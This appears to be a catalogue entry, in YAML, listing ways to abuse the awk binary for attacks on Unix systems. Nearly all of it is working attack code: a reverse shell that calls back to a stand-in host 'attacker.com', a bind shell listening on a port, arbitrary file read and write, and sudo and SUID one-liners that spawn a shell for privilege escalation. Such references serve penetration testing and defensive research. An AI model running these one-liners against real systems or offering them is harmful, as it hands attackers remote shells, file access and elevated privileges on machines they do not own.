---
functions:
  shell:
    - code: awk 'BEGIN {system("/bin/sh")}'
  non-interactive-reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
            s = "/inet/tcp/0/" RHOST "/" RPORT;
            while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
            while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
  non-interactive-bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        LPORT=12345
        awk -v LPORT=$LPORT 'BEGIN {
            s = "/inet/tcp/" LPORT "/0/0";
            while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
            while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
  file-write:
    - code: |
        LFILE=file_to_write
        awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
  file-read:
    - code: |
        LFILE=file_to_read
        awk '//' "$LFILE"
  sudo:
    - code: sudo awk 'BEGIN {system("/bin/sh")}'
  limited-suid:
    - code: ./awk 'BEGIN {system("/bin/sh")}'
---
